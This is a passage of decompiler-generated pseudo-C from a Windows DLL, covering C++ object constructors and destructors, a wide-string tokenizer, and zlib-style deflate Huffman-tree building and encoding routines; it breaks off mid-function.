// 100BD3F8: using guessed type char byte_100BD3F8;
// 100BD3FA: using guessed type char byte_100BD3FA;
// 100BD408: using guessed type int dword_100BD408;
// 100BE194: using guessed type int dword_100BE194;
// 100BEFA8: using guessed type int dword_100BEFA8;

//----- (100376F3) --------------------------------------------------------
_DWORD *__stdcall sub_100376F3(_DWORD *a1)
{
  sub_10016441(a1);
  *a1 = &off_10094E8C;
  return a1;
}
// 10094E8C: using guessed type int (__thiscall *off_10094E8C)(void *Block, char);

//----- (10037721) --------------------------------------------------------
void __thiscall sub_10037721(_DWORD *this)
{
  *this = &off_10094E8C;
  sub_1001646C(this);
}
// 10094E8C: using guessed type int (__thiscall *off_10094E8C)(void *Block, char);

//----- (10037745) --------------------------------------------------------
_DWORD *__stdcall sub_10037745(_DWORD *a1)
{
  sub_100376F3(a1);
  *a1 = &off_10095070;
  return a1;
}
// 10095070: using guessed type int (__thiscall *off_10095070)(void *Block, char);

//----- (10037772) --------------------------------------------------------
void __thiscall sub_10037772(_DWORD *this)
{
  *this = &off_10095070;
  sub_10037721(this);
}
// 10095070: using guessed type int (__thiscall *off_10095070)(void *Block, char);

//----- (10037796) --------------------------------------------------------
_DWORD *__stdcall sub_10037796(_DWORD *a1)
{
  sub_100376F3(a1);
  *a1 = &off_10094E94;
  return a1;
}
// 10094E94: using guessed type int (__thiscall *off_10094E94)(void *Block, char);

//----- (100377C3) --------------------------------------------------------
void __thiscall sub_100377C3(_DWORD *this)
{
  *this = &off_10094E94;
  sub_10037721(this);
}
// 10094E94: using guessed type int (__thiscall *off_10094E94)(void *Block, char);

//----- (100377E7) --------------------------------------------------------
_DWORD *__stdcall sub_100377E7(_DWORD *a1)
{
  sub_100376F3(a1);
  *a1 = &off_10094EC0;
  return a1;
}
// 10094EC0: using guessed type int (__thiscall *off_10094EC0)(void *Block, char);

//----- (10037814) --------------------------------------------------------
void __thiscall sub_10037814(_DWORD *this)
{
  *this = &off_10094EC0;
  sub_10037721(this);
}
// 10094EC0: using guessed type int (__thiscall *off_10094EC0)(void *Block, char);

//----- (10037838) --------------------------------------------------------
_DWORD *__stdcall sub_10037838(_DWORD *a1)
{
  sub_100376F3(a1);
  *a1 = &off_10094E9C;
  return a1;
}
// 10094E9C: using guessed type int (__thiscall *off_10094E9C)(void *Block, char);

//----- (10037865) --------------------------------------------------------
void __thiscall sub_10037865(_DWORD *this)
{
  *this = &off_10094E9C;
  sub_10037721(this);
}
// 10094E9C: using guessed type int (__thiscall *off_10094E9C)(void *Block, char);

//----- (10037889) --------------------------------------------------------
_DWORD *__stdcall sub_10037889(_DWORD *a1)
{
  sub_100376F3(a1);
  *a1 = &off_10094EA4;
  return a1;
}
// 10094EA4: using guessed type int (__thiscall *off_10094EA4)(void *Block, char);

//----- (100378B6) --------------------------------------------------------
void __thiscall sub_100378B6(_DWORD *this)
{
  *this = &off_10094EA4;
  sub_10037721(this);
}
// 10094EA4: using guessed type int (__thiscall *off_10094EA4)(void *Block, char);

//----- (100378DA) --------------------------------------------------------
_DWORD *__stdcall sub_100378DA(_DWORD *a1)
{
  sub_100376F3(a1);
  *a1 = &off_10094EAC;
  return a1;
}
// 10094EAC: using guessed type int (__thiscall *off_10094EAC)(void *Block, char);

//----- (10037907) --------------------------------------------------------
void __thiscall sub_10037907(_DWORD *this)
{
  *this = &off_10094EAC;
  sub_10037721(this);
}
// 10094EAC: using guessed type int (__thiscall *off_10094EAC)(void *Block, char);

//----- (1003792B) --------------------------------------------------------
_DWORD *__stdcall sub_1003792B(_DWORD *a1, int a2)
{
  *a1 = off_100950F4;
  sub_1000CE26(a1 + 1, a2);
  sub_1000CE26(a1 + 3, (int)&unk_100BF74C);
  sub_10037BCC(a1 + 5, (int)(a1 + 1), (int)(a1 + 3), 0);
  sub_10037BCC(a1 + 12, (int)(a1 + 1), (int)(a1 + 3), *(_DWORD *)(a1[2] + 28));
  return a1;
}
// 100950F4: using guessed type int (__thiscall *off_100950F4[3])(void *Block, char);

//----- (10037992) --------------------------------------------------------
int *__thiscall sub_10037992(int *Block, char a2)
{
  sub_10037A12(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100379B1) --------------------------------------------------------
_DWORD *__userpurge sub_100379B1@<eax>(int a1@<ebx>, _DWORD *a2)
{
  *a2 = off_100950F4;
  sub_1000CE26(a2 + 1, a1 + 4);
  sub_1000CE26(a2 + 3, a1 + 12);
  sub_10037B79(a1 + 20, a2 + 5);
  sub_10037B79(a1 + 48, a2 + 12);
  return a2;
}
// 100950F4: using guessed type int (__thiscall *off_100950F4[3])(void *Block, char);

//----- (10037A12) --------------------------------------------------------
LONG __thiscall sub_10037A12(int *this)
{
  *this = (int)off_100950F4;
  sub_10037C1D(this + 12);
  sub_10037C1D(this + 5);
  sub_1000CE59(this + 3);
  return sub_1000CE59(this + 1);
}
// 100950F4: using guessed type int (__thiscall *off_100950F4[3])(void *Block, char);

//----- (10037AB1) --------------------------------------------------------
_DWORD *__thiscall sub_10037AB1(void *this, _DWORD *a2)
{
  sub_10037B79((int)this + 20, a2);
  return a2;
}

//----- (10037AE4) --------------------------------------------------------
_DWORD *__thiscall sub_10037AE4(void *this, _DWORD *a2)
{
  sub_10037B79((int)this + 48, a2);
  return a2;
}

//----- (10037B17) --------------------------------------------------------
_DWORD *__stdcall sub_10037B17(_DWORD *a1)
{
  *a1 = off_100950F8;
  sub_1000CC20(a1 + 1, &word_100B6A44);
  sub_1000CC20(a1 + 3, &word_100B6A48);
  return a1;
}
// 100950F8: using guessed type int (__thiscall *off_100950F8[2])(void *Block, char);
// 100B6A44: using guessed type wchar_t word_100B6A44;
// 100B6A48: using guessed type wchar_t word_100B6A48;

//----- (10037B5A) --------------------------------------------------------
int *__thiscall sub_10037B5A(int *Block, char a2)
{
  sub_10037C1D(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10037B79) --------------------------------------------------------
_DWORD *__userpurge sub_10037B79@<eax>(int a1@<esi>, _DWORD *a2)
{
  *a2 = off_100950F8;
  sub_1000CE26(a2 + 1, a1 + 4);
  sub_1000CE26(a2 + 3, a1 + 12);
  a2[5] = *(_DWORD *)(a1 + 20);
  a2[6] = sub_10037D10(a2);
  return a2;
}
// 100950F8: using guessed type int (__thiscall *off_100950F8[2])(void *Block, char);

//----- (10037BCC) --------------------------------------------------------
_DWORD *__stdcall sub_10037BCC(_DWORD *a1, int a2, int a3, int a4)
{
  *a1 = off_100950F8;
  sub_1000CE26(a1 + 1, a2);
  sub_1000CE26(a1 + 3, a3);
  a1[5] = a4;
  a1[6] = sub_10037D10(a1);
  return a1;
}
// 100950F8: using guessed type int (__thiscall *off_100950F8[2])(void *Block, char);

//----- (10037C1D) --------------------------------------------------------
LONG __thiscall sub_10037C1D(int *this)
{
  *this = (int)off_100950F8;
  sub_1000CE59(this + 3);
  return sub_1000CE59(this + 1);
}
// 100950F8: using guessed type int (__thiscall *off_100950F8[2])(void *Block, char);

//----- (10037C52) --------------------------------------------------------
_DWORD *__usercall sub_10037C52@<eax>(_DWORD *a1@<eax>)
{
  unsigned int v2; // eax
  int v3; // ecx

  v2 = a1[6];
  v3 = a1[2];
  a1[5] = v2;
  if ( v2 < *(_DWORD *)(v3 + 28) )
  {
    a1[5] = v2 + 1;
    a1[6] = sub_10037D10(a1);
  }
  return a1;
}

//----- (10037C73) --------------------------------------------------------
_DWORD *__thiscall sub_10037C73(_DWORD *this, _DWORD *a2)
{
  rsize_t v3; // edi
  wchar_t *v4; // eax
  wchar_t *v5; // eax
  unsigned int v7; // [esp-Ch] [ebp-50h]
  const wchar_t *v8; // [esp-8h] [ebp-4Ch]
  int v9[5]; // [esp+10h] [ebp-34h] BYREF
  _DWORD pExceptionObject[3]; // [esp+24h] [ebp-20h] BYREF
  int v11; // [esp+30h] [ebp-14h]
  int v12; // [esp+34h] [ebp-10h]
  int v13; // [esp+40h] [ebp-4h]

  v11 = 0;
  v3 = this[6] - this[5];
  v12 = this[5];
  sub_10016983((void *)(2 * v3 + 2), (int)v9, 0);
  v13 = 1;
  v8 = (const wchar_t *)(*(_DWORD *)(this[2] + 12) + 2 * v12);
  v7 = (unsigned int)v9[3] >> 1;
  v4 = (wchar_t *)sub_10016C00(v9);
  if ( wcsncpy_s(v4, v7, v8, v3) )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  v5 = (wchar_t *)sub_10016C24(v9);
  sub_1000CC20(a2, v5);
  v11 = 1;
  LOBYTE(v13) = 0;
  sub_10016B53(v9);
  return a2;
}
// 10037C73: using guessed type _DWORD pExceptionObject[3];

//----- (10037D10) --------------------------------------------------------
unsigned int __usercall sub_10037D10@<eax>(_DWORD *a1@<edi>)
{
  unsigned int i; // esi
  int v2; // eax

  for ( i = a1[5]; ; ++i )
  {
    v2 = a1[2];
    if ( i >= *(_DWORD *)(v2 + 28) || wcschr(*(const wchar_t **)(a1[4] + 12), *(_WORD *)(*(_DWORD *)(v2 + 12) + 2 * i)) )
      break;
  }
  return i;
}

//----- (10037D3D) --------------------------------------------------------
int *__usercall sub_10037D3D@<eax>(int *a1@<ebx>, int *a2@<esi>)
{
  if ( a2 != a1 )
  {
    sub_10002C25(a1 + 2, a2 + 2);
    sub_10002C25(a1 + 4, a2 + 4);
    a2[5] = a1[5];
    a2[6] = a1[6];
  }
  return a2;
}

//----- (10037D68) --------------------------------------------------------
bool __usercall sub_10037D68@<al>(int a1@<edi>, int a2@<esi>)
{
  return a1 == a2
      || *(_DWORD *)(a1 + 20) == *(_DWORD *)(a2 + 20)
      && !sub_1000D0B5(a2 + 4, a1 + 4)
      && !sub_1000D0B5(a2 + 12, a1 + 12);
}

//----- (10037DA8) --------------------------------------------------------
__int64 __usercall sub_10037DA8@<edx:eax>(__int64 result@<edx:eax>)
{
  *(_WORD *)(result + 5816) = 0;
  *(_DWORD *)(result + 5820) = 0;
  *(_DWORD *)(result + 2840) = result + 148;
  *(_DWORD *)(result + 2852) = result + 2440;
  *(_DWORD *)(result + 2848) = &off_100BC568;
  *(_DWORD *)(result + 2860) = &off_100BC57C;
  *(_DWORD *)(result + 2864) = result + 2684;
  *(_DWORD *)(result + 2872) = &unk_100BC590;
  *(_DWORD *)(result + 5812) = 8;
  return sub_10037E08(result);
}
// 100BC568: using guessed type void *off_100BC568;
// 100BC57C: using guessed type void *off_100BC57C;

//----- (10037E08) --------------------------------------------------------
__int64 __usercall sub_10037E08@<edx:eax>(__int64 result@<edx:eax>)
{
  _WORD *v1; // ecx
  int v2; // esi
  _WORD *v3; // ecx
  int v4; // esi
  _WORD *v5; // ecx
  int v6; // esi

  v1 = (_WORD *)(result + 148);
  v2 = 286;
  HIDWORD(result) = 0;
  do
  {
    *v1 = 0;
    v1 += 2;
    --v2;
  }
  while ( v2 );
  v3 = (_WORD *)(result + 2440);
  v4 = 30;
  do
  {
    *v3 = 0;
    v3 += 2;
    --v4;
  }
  while ( v4 );
  v5 = (_WORD *)(result + 2684);
  v6 = 19;
  do
  {
    *v5 = 0;
    v5 += 2;
    --v6;
  }
  while ( v6 );
  *(_WORD *)(result + 1172) = 1;
  *(_DWORD *)(result + 5804) = 0;
  *(_DWORD *)(result + 5800) = 0;
  *(_DWORD *)(result + 5808) = 0;
  *(_DWORD *)(result + 5792) = 0;
  return result;
}

//----- (10037E66) --------------------------------------------------------
int __usercall sub_10037E66@<eax>(int result@<eax>, int a2@<edi>, int a3)
{
  int v3; // edx
  int v4; // ecx
  bool v5; // cc
  int v6; // esi
  unsigned __int16 v7; // bx
  unsigned __int16 v8; // dx
  int v9; // esi
  unsigned __int16 v10; // dx
  unsigned __int16 v11; // bx
  int v12; // edx
  int v13; // [esp+0h] [ebp-4h]

  v13 = *(_DWORD *)(result + 4 * a3 + 2908);
  v3 = *(_DWORD *)(result + 5200);
  v4 = 2 * a3;
  v5 = 2 * a3 < v3;
  if ( 2 * a3 <= v3 )
  {
    do
    {
      if ( v5 )
      {
        v6 = *(_DWORD *)(result + 4 * v4 + 2912);
        v7 = *(_WORD *)(a2 + 4 * v6);
        v8 = *(_WORD *)(a2 + 4 * *(_DWORD *)(result + 4 * v4 + 2908));
        if ( v7 < v8
          || v7 == v8
          && *(_BYTE *)(v6 + result + 5208) <= *(_BYTE *)(*(_DWORD *)(result + 4 * v4 + 2908) + result + 5208) )
        {
          ++v4;
        }
      }
      v9 = *(_DWORD *)(result + 4 * v4 + 2908);
      v10 = *(_WORD *)(a2 + 4 * v13);
      v11 = *(_WORD *)(a2 + 4 * v9);
      if ( v10 < v11 || v10 == v11 && *(_BYTE *)(v13 + result + 5208) <= *(_BYTE *)(v9 + result + 5208) )
        break;
      *(_DWORD *)(result + 4 * a3 + 2908) = v9;
      v12 = *(_DWORD *)(result + 5200);
      a3 = v4;
      v4 *= 2;
      v5 = v4 < v12;
    }
    while ( v4 <= v12 );
  }
  *(_DWORD *)(result + 4 * a3 + 2908) = v13;
  return result;
}

//----- (10037F16) --------------------------------------------------------
int __usercall sub_10037F16@<eax>(int *a1@<eax>, _DWORD *a2@<edx>)
{
  int v2; // ebx
  int *v3; // eax
  int result; // eax
  int v5; // esi
  int v6; // ecx
  int v7; // edi
  int v8; // ecx
  _WORD *i; // edi
  _DWORD *v10; // esi
  unsigned __int16 *v11; // ecx
  int v12; // esi
  int v13; // [esp+8h] [ebp-28h]
  _DWORD *v14; // [esp+8h] [ebp-28h]
  int v15; // [esp+Ch] [ebp-24h]
  int v16; // [esp+10h] [ebp-20h]
  int v17; // [esp+14h] [ebp-1Ch]
  int v18; // [esp+18h] [ebp-18h]
  int v19; // [esp+18h] [ebp-18h]
  int v20; // [esp+1Ch] [ebp-14h]
  int *v21; // [esp+20h] [ebp-10h]
  int v22; // [esp+20h] [ebp-10h]
  int v23; // [esp+24h] [ebp-Ch]
  _WORD *v24; // [esp+24h] [ebp-Ch]
  int v25; // [esp+28h] [ebp-8h]
  int v26; // [esp+2Ch] [ebp-4h]
  int v27; // [esp+2Ch] [ebp-4h]

  v26 = 0;
  v16 = a1[1];
  v2 = *a1;
  v3 = (int *)a1[2];
  v13 = *v3;
  v15 = v3[1];
  v20 = v3[2];
  v25 = v3[4];
  memset(a2 + 719, 0, 0x20u);
  *(_WORD *)(v2 + 4 * a2[a2[1301] + 727] + 2) = 0;
  result = a2[1301] + 1;
  if ( result < 573 )
  {
    v21 = &a2[result + 727];
    v17 = 573 - result;
    result = 573;
    do
    {
      v5 = *v21;
      v18 = 4 * *v21;
      v6 = *(unsigned __int16 *)(v2 + 4 * *(unsigned __int16 *)(v18 + v2 + 2) + 2) + 1;
      if ( v6 > v25 )
      {
        v6 = v25;
        ++v26;
      }
      *(_WORD *)(v18 + v2 + 2) = v6;
      if ( v5 <= v16 )
      {
        ++*((_WORD *)a2 + v6 + 1438);
        v23 = 0;
        if ( v5 >= v20 )
          v23 = *(_DWORD *)(v15 + 4 * (v5 - v20));
        v7 = v18;
        v19 = *(unsigned __int16 *)(v18 + v2);
        a2[1450] += v19 * (v6 + v23);
        if ( v13 )
          a2[1451] += v19 * (v23 + *(unsigned __int16 *)(v7 + v13 + 2));
      }
      ++v21;
      --v17;
    }
    while ( v17 );
    if ( v26 )
    {
      do
      {
        v8 = v25 - 1;
        for ( i = (_WORD *)a2 + v25 + 1437; !*i; --i )
          --v8;
        --*((_WORD *)a2 + v8 + 1438);
        v26 -= 2;
        *((_WORD *)a2 + v8 + 1439) += 2;
        --*((_WORD *)a2 + v25 + 1438);
      }
      while ( v26 > 0 );
      v27 = v25;
      if ( v25 )
      {
        v24 = (_WORD *)a2 + v25 + 1438;
        do
        {
          v22 = (unsigned __int16)*v24;
          if ( *v24 )
          {
            v10 = &a2[result + 727];
            do
            {
              --v10;
              --result;
              v14 = v10;
              if ( *v10 <= v16 )
              {
                v11 = (unsigned __int16 *)(v2 + 4 * *v10);
                v12 = v11[1];
                if ( v12 != v27 )
                {
                  a2[1450] += *v11 * (v27 - v12);
                  v11[1] = v27;
                }
                --v22;
                v10 = v14;
              }
            }
            while ( v22 );
          }
          --v27;
          --v24;
        }
        while ( v27 );
      }
    }
  }
  return result;
}

//----- (100380D3) --------------------------------------------------------
unsigned int __usercall sub_100380D3@<eax>(int a1@<edx>, int a2@<esi>, int a3)
{
  int v3; // ebx
  unsigned int result; // eax
  int v5; // ecx
  int v6; // edx
  unsigned __int16 v7; // di
  __int16 *v8; // eax
  unsigned int v9; // [esp-8h] [ebp-34h]
  int v10; // [esp-4h] [ebp-30h]
  __int16 v11; // [esp+8h] [ebp-24h] BYREF
  char v12; // [esp+Ah] [ebp-22h] BYREF

  v3 = 0;
  LOWORD(result) = 0;
  v5 = 1;
  v6 = a1 - (_DWORD)&v12;
  do
  {
    v7 = 2 * (result + *(__int16 *)((char *)&v11 + 2 * v5 + v6));
    result = v7;
    *(&v11 + v5++) = v7;
  }
  while ( v5 <= 15 );
  if ( a3 >= 0 )
  {
    do
    {
      if ( *(_WORD *)(a2 + 4 * v3 + 2) )
      {
        v8 = &v11 + *(unsigned __int16 *)(a2 + 4 * v3 + 2);
        v10 = *(unsigned __int16 *)(a2 + 4 * v3 + 2);
        v9 = (unsigned __int16)(*v8)++;
        result = sub_100393C5(v9, v10);
        *(_WORD *)(a2 + 4 * v3) = result;
      }
      ++v3;
    }
    while ( v3 <= a3 );
  }
  return result;
}

//----- (1003814A) --------------------------------------------------------
unsigned int __usercall sub_1003814A@<eax>(_DWORD *a1@<ebx>, int *a2)
{
  int *v2; // eax
  int v3; // ecx
  int v4; // edx
  int v5; // eax
  int v6; // edi
  int v7; // eax
  int i; // esi
  int v9; // eax
  int v10; // ecx
  int v11; // esi
  int v12; // eax
  unsigned __int8 v13; // al
  _WORD *v15; // [esp+Ch] [ebp-10h]
  int v16; // [esp+10h] [ebp-Ch]
  int v17; // [esp+14h] [ebp-8h]
  int v18; // [esp+18h] [ebp-4h]

  v17 = -1;
  v2 = (int *)a2[2];
  v3 = v2[3];
  v4 = *v2;
  v5 = 0;
  v6 = *a2;
  v18 = v3;
  a1[1300] = 0;
  for ( a1[1301] = 573; v5 < v3; ++v5 )
  {
    if ( *(_WORD *)(v6 + 4 * v5) )
    {
      a1[++a1[1300] + 727] = v5;
      v17 = v5;
      *((_BYTE *)a1 + v5 + 5208) = 0;
    }
    else
    {
      *(_WORD *)(v6 + 4 * v5 + 2) = 0;
    }
  }
  while ( (int)a1[1300] < 2 )
  {
    if ( v17 >= 2 )
      v7 = 0;
    else
      v7 = ++v17;
    a1[++a1[1300] + 727] = v7;
    *(_WORD *)(4 * v7 + v6) = 1;
    *((_BYTE *)a1 + v7 + 5208) = 0;
    --a1[1450];
    if ( v4 )
      a1[1451] -= *(unsigned __int16 *)(4 * v7 + v4 + 2);
  }
  a2[1] = v17;
  for ( i = a1[1300] / 2; i >= 1; --i )
    sub_10037E66((int)a1, v6, i);
  v16 = v18;
  do
  {
    v9 = a1[1300];
    v10 = a1[v9 + 727];
    v11 = a1[728];
    a1[1300] = v9 - 1;
    a1[728] = v10;
    sub_10037E66((int)a1, v6, 1);
    --a1[1301];
    v12 = a1[728];
    a1[a1[1301]-- + 727] = v11;
    a1[a1[1301] + 727] = v12;
    v15 = (_WORD *)(v6 + 4 * v12);
    *(_WORD *)(v6 + 4 * v16) = *(_WORD *)(v6 + 4 * v11) + *v15;
    v13 = *((_BYTE *)a1 + v12 + 5208);
    if ( *((_BYTE *)a1 + v11 + 5208) >= v13 )
      v13 = *((_BYTE *)a1 + v11 + 5208);
    *((_BYTE *)a1 + v16 + 5208) = v13 + 1;
    v15[1] = v16;
    *(_WORD *)(v6 + 4 * v11 + 2) = v16;
    a1[728] = v16++;
    sub_10037E66((int)a1, v6, 1);
  }
  while ( (int)a1[1300] >= 2 );
  a1[--a1[1301] + 727] = a1[728];
  sub_10037F16(a2, a1);
  return sub_100380D3((int)(a1 + 719), v6, v17);
}

//----- (10038332) --------------------------------------------------------
int __usercall sub_10038332@<eax>(int result@<eax>, int a2@<ecx>, _WORD *a3)
{
  int v4; // ecx
  int v5; // edx
  int v6; // ebx
  int v7; // edi
  int i; // esi
  int v9; // [esp-4h] [ebp-18h]
  int v10; // [esp+Ch] [ebp-8h]
  unsigned __int16 *v11; // [esp+10h] [ebp-4h]

  v10 = -1;
  v4 = *(unsigned __int16 *)(result + 2);
  v5 = 7;
  v6 = 0;
  v7 = 4;
  if ( !*(_WORD *)(result + 2) )
  {
    v5 = 138;
    v7 = 3;
  }
  *(_WORD *)(result + 4 * a2 + 6) = -1;
  if ( a2 >= 0 )
  {
    v11 = (unsigned __int16 *)(result + 6);
    for ( i = a2 + 1; i; --i )
    {
      result = v4;
      v4 = *v11;
      if ( ++v6 < v5 && result == v4 )
        goto LABEL_23;
      if ( v6 >= v7 )
      {
        if ( result )
        {
          if ( result != v10 )
            ++a3[2 * result + 1342];
          ++a3[1374];
        }
        else if ( v6 > 10 )
        {
          ++a3[1378];
        }
        else
        {
          ++a3[1376];
        }
      }
      else
      {
        a3[2 * result + 1342] += v6;
      }
      v6 = 0;
      v10 = result;
      if ( v4 )
      {
        if ( result != v4 )
        {
          v5 = 7;
          v9 = 4;
          goto LABEL_22;
        }
        v5 = 6;
      }
      else
      {
        v5 = 138;
      }
      v9 = 3;
LABEL_22:
      v7 = v9;
LABEL_23:
      v11 += 2;
    }
  }
  return result;
}

//----- (100383EE) --------------------------------------------------------
int __usercall sub_100383EE@<eax>(int result@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v3; // edi
  int v4; // esi
  int v5; // ebx
  int v6; // edx
  int v7; // edi
  int v8; // ecx
  unsigned __int16 v9; // si
  int v10; // edx
  int v11; // ecx
  int v12; // edx
  __int16 v13; // si
  int v14; // ecx
  __int16 v15; // bx
  int v16; // ecx
  int v17; // edi
  int v18; // ecx
  unsigned __int16 v19; // si
  int v20; // edx
  int v21; // ecx
  int v22; // edx
  __int16 v23; // si
  int v24; // ecx
  __int16 v25; // bx
  int v26; // ecx
  int v27; // ecx
  unsigned __int16 v28; // si
  int v29; // edi
  int v30; // ecx
  int v31; // ebx
  int v32; // ecx
  int v33; // esi
  int v34; // edi
  int v35; // ecx
  int v36; // ebx
  __int16 v37; // si
  int v38; // ebx
  int v39; // ecx
  int v40; // ecx
  unsigned __int16 v41; // si
  int v42; // edi
  int v43; // ecx
  int v44; // ebx
  int v45; // ecx
  int v46; // esi
  int v47; // edi
  int v48; // ecx
  int v49; // ebx
  unsigned __int16 v50; // si
  int v51; // edi
  int v52; // ecx
  int v53; // ebx
  int v54; // ecx
  int v55; // esi
  int v56; // edi
  int v57; // ecx
  int v58; // ebx
  int v59; // [esp-4h] [ebp-28h]
  int i; // [esp+Ch] [ebp-18h]
  int v61; // [esp+10h] [ebp-14h]
  int v62; // [esp+14h] [ebp-10h]
  int v63; // [esp+14h] [ebp-10h]
  int v64; // [esp+14h] [ebp-10h]
  int v65; // [esp+14h] [ebp-10h]
  unsigned __int16 *v66; // [esp+18h] [ebp-Ch]
  int v67; // [esp+1Ch] [ebp-8h]
  int v68; // [esp+20h] [ebp-4h]

  v61 = -1;
  v67 = *(unsigned __int16 *)(a3 + 2);
  v3 = 7;
  v4 = 0;
  v5 = 4;
  if ( !*(_WORD *)(a3 + 2) )
  {
    v3 = 138;
    v5 = 3;
  }
  if ( a2 >= 0 )
  {
    v66 = (unsigned __int16 *)(a3 + 6);
    for ( i = a2 + 1; i; --i )
    {
      v6 = v67;
      ++v4;
      v62 = v67;
      v67 = *v66;
      v68 = v4;
      if ( v4 < v3 && v6 == *v66 )
        goto LABEL_47;
      if ( v4 >= v5 )
      {
        if ( v6 )
        {
          if ( v6 != v61 )
          {
            v17 = *(unsigned __int16 *)(result + 4 * v6 + 2686);
            v18 = *(_DWORD *)(result + 5820);
            if ( v18 <= 16 - v17 )
            {
              v25 = *(_WORD *)(result + 4 * v6 + 2684) << v18;
              v26 = *(_DWORD *)(result + 5820);
              *(_WORD *)(result + 5816) |= v25;
              v24 = v17 + v26;
            }
            else
            {
              v19 = *(_WORD *)(result + 4 * v6 + 2684);
              v20 = v19 << v18;
              v21 = *(_DWORD *)(result + 8);
              *(_WORD *)(result + 5816) |= v20;
              *(_BYTE *)(v21 + (*(_DWORD *)(result + 20))++) = *(_BYTE *)(result + 5816);
              *(_BYTE *)(*(_DWORD *)(result + 20) + *(_DWORD *)(result + 8)) = *(_BYTE *)(result + 5817);
              v22 = *(_DWORD *)(result + 5820);
              ++*(_DWORD *)(result + 20);
              v23 = v19 >> (16 - v22);
              v24 = v22 + v17 - 16;
              v6 = v62;
              *(_WORD *)(result + 5816) = v23;
              v4 = v68;
            }
            --v4;
            *(_DWORD *)(result + 5820) = v24;
            v68 = v4;
          }
          v27 = *(_DWORD *)(result + 5820);
          v63 = *(unsigned __int16 *)(result + 2750);
          if ( v27 <= 16 - v63 )
          {
            *(_WORD *)(result + 5816) |= *(_WORD *)(result + 2748) << v27;
            v32 = v63 + v27;
          }
          else
          {
            v28 = *(_WORD *)(result + 2748);
            v29 = v28 << v27;
            v30 = *(_DWORD *)(result + 8);
            *(_WORD *)(result + 5816) |= v29;
            *(_BYTE *)(v30 + (*(_DWORD *)(result + 20))++) = *(_BYTE *)(result + 5816);
            *(_BYTE *)(*(_DWORD *)(result + 20) + *(_DWORD *)(result + 8)) = *(_BYTE *)(result + 5817);
            v31 = *(_DWORD *)(result + 5820);
            ++*(_DWORD *)(result + 20);
            v32 = v31 + v63 - 16;
            *(_WORD *)(result + 5816) = v28 >> (16 - v31);
            v4 = v68;
          }
          v33 = v4 - 3;
          *(_DWORD *)(result + 5820) = v32;
          if ( v32 > 14 )
          {
            v34 = v33 << v32;
            v35 = *(_DWORD *)(result + 8);
            *(_WORD *)(result + 5816) |= v34;
            *(_BYTE *)(v35 + (*(_DWORD *)(result + 20))++) = *(_BYTE *)(result + 5816);
            *(_BYTE *)(*(_DWORD *)(result + 20) + *(_DWORD *)(result + 8)) = *(_BYTE *)(result + 5817);
            v36 = *(_DWORD *)(result + 5820);
            ++*(_DWORD *)(result + 20);
            v37 = (unsigned __int16)v33 >> (16 - v36);
            v38 = v36 - 14;
LABEL_37:
            *(_WORD *)(result + 5816) = v37;
            *(_DWORD *)(result + 5820) = v38;
            goto LABEL_40;
          }
          *(_WORD *)(result + 5816) |= v33 << v32;
          v39 = v32 + 2;
        }
        else
        {
          v40 = *(_DWORD *)(result + 5820);
          if ( v4 > 10 )
          {
            v65 = *(unsigned __int16 *)(result + 2758);
            if ( v40 <= 16 - v65 )
            {
              *(_WORD *)(result + 5816) |= *(_WORD *)(result + 2756) << v40;
              v54 = v65 + v40;
            }
            else
            {
              v50 = *(_WORD *)(result + 2756);
              v51 = v50 << v40;
              v52 = *(_DWORD *)(result + 8);
              *(_WORD *)(result + 5816) |= v51;
              *(_BYTE *)(v52 + (*(_DWORD *)(result + 20))++) = *(_BYTE *)(result + 5816);
              *(_BYTE *)(*(_DWORD *)(result + 20) + *(_DWORD *)(result + 8)) = *(_BYTE *)(result + 5817);
              v53 = *(_DWORD *)(result + 5820);
              ++*(_DWORD *)(result + 20);
              v54 = v53 + v65 - 16;
              *(_WORD *)(result + 5816) = v50 >> (16 - v53);
              v4 = v68;
            }
            v55 = v4 - 11;
            *(_DWORD *)(result + 5820) = v54;
            if ( v54 > 9 )
            {
              v56 = v55 << v54;
              v57 = *(_DWORD *)(result + 8);
              *(_WORD *)(result + 5816) |= v56;
              *(_BYTE *)(v57 + (*(_DWORD *)(result + 20))++) = *(_BYTE *)(result + 5816);
              *(_BYTE *)(*(_DWORD *)(result + 20) + *(_DWORD *)(result + 8)) = *(_BYTE *)(result + 5817);
              v58 = *(_DWORD *)(result + 5820);
              ++*(_DWORD *)(result + 20);
              v37 = (unsigned __int16)v55 >> (16 - v58);
              v38 = v58 - 9;
              goto LABEL_37;
            }
            *(_WORD *)(result + 5816) |= v55 << v54;
            v39 = v54 + 7;
          }
          else
          {
            v64 = *(unsigned __int16 *)(result + 2754);
            if ( v40 <= 16 - v64 )
            {
              *(_WORD *)(result + 5816) |= *(_WORD *)(result + 2752) << v40;
              v45 = v64 + v40;
            }
            else
            {
              v41 = *(_WORD *)(result + 2752);
              v42 = v41 << v40;
              v43 = *(_DWORD *)(result + 8);
              *(_WORD *)(result + 5816) |= v42;
              *(_BYTE *)(v43 + (*(_DWORD *)(result + 20))++) = *(_BYTE *)(result + 5816);
              *(_BYTE *)(*(_DWORD *)(result + 20) + *(_DWORD *)(result + 8)) = *(_BYTE *)(result + 5817);
              v44 = *(_DWORD *)(result + 5820);
              ++*(_DWORD *)(result + 20);
              v45 = v44 + v64 - 16;
              *(_WORD *)(result + 5816) = v41 >> (16 - v44);
              v4 = v68;
            }
            v46 = v4 - 3;
            *(_DWORD *)(result + 5820) = v45;
            if ( v45 > 13 )
            {
              v47 = v46 << v45;
              v48 = *(_DWORD *)(result + 8);
              *(_WORD *)(result + 5816) |= v47;
              *(_BYTE *)(v48 + (*(_DWORD *)(result + 20))++) = *(_BYTE *)(result + 5816);
              *(_BYTE *)(*(_DWORD *)(result + 20) + *(_DWORD *)(result + 8)) = *(_BYTE *)(result + 5817);
              v49 = *(_DWORD *)(result + 5820);
              ++*(_DWORD *)(result + 20);
              v37 = (unsigned __int16)v46 >> (16 - v49);
              v38 = v49 - 13;
              goto LABEL_37;
            }
            *(_WORD *)(result + 5816) |= v46 << v45;
            v39 = v45 + 3;
          }
        }
        *(_DWORD *)(result + 5820) = v39;
      }
      else
      {
        do
        {
          v7 = *(unsigned __int16 *)(result + 4 * v6 + 2686);
          v8 = *(_DWORD *)(result + 5820);
